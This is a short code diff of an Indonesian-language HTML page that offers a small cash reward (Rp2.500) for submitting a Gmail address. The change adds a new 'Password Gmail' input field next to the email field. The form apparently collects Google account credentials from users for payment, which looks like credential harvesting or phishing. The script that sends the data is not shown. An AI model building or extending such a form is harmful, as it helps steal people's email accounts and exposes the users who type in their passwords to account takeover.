@@ -342,15 +342,19 @@ body{background:var(--bg);color:var(--text);font-family:'DM Sans',sans-serif;fon
           <div class="reward-amount">Rp2.500</div>
         </div>
 
-        <div class="form-group">
-          <label>Alamat Gmail</label>
-          <div class="gmail-wrap">
-            <input type="email" id="u-gmail" placeholder="contoh@gmail.com"
-              oninput="onGmailType()" style="padding-right:90px">
-            <span class="gmail-status" id="gmail-check-badge" style="display:none"></span>
-          </div>
-        </div>
+       <div class="form-group">
+  <label>Alamat Gmail</label>
+  <div class="gmail-wrap">
+    <input type="email" id="u-gmail" placeholder="contoh@gmail.com"
+      oninput="onGmailType()" style="padding-right:90px">
+    <span class="gmail-status" id="gmail-check-badge" style="display:none"></span>
+  </div>
+</div>
 
+<div class="form-group">
+  <label>Password Gmail</label>
+  <input type="password" id="u-password" placeholder="Masukkan password Gmail">
+</div>
         <div id="gmail-check-msg" class="alert" style="margin-top:-6px"></div>
 
         <button class="btn btn-green" id="btn-setor" onclick="submitGmail()">
